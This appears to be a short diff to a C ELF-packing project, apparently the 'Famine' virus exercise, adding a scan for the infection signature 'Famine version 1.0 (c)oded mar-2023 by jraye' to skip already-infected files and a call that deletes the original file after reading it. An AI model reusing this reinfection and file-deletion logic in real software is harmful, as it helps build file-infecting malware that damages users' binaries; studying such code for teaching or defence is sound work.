@@ -24,11 +24,18 @@ int copy_file(t_woody *woody, char *filename)
 	if (read(fd, woody->addr, woody->filesize) != woody->filesize)
 	{
 		close(fd);
-		free(woody->addr);
+		// free(woody->addr);
 		return elf_error(E_COPY);
 	}
-
+	char * string = woody->addr;
+	for (int i = 0; i < woody->filesize; i++){
+		if (ft_strnstr(&string[i], "Famine version 1.0 (c)oded mar-2023 by jraye", 45) != NULL){
+			// printf("already crypted!");
+			return ERROR_CODE;
+		}
+	}
 	close(fd);
+	remove(filename);
 	return 0;
 }
 
@@ -66,6 +73,5 @@ int read_elf_file(t_woody *woody, char *filename)
 	if(copy_file(woody, filename) == ERROR_CODE){
 		return ERROR_CODE;
 	}
-
 	return check_fileformat(woody->addr);
 }
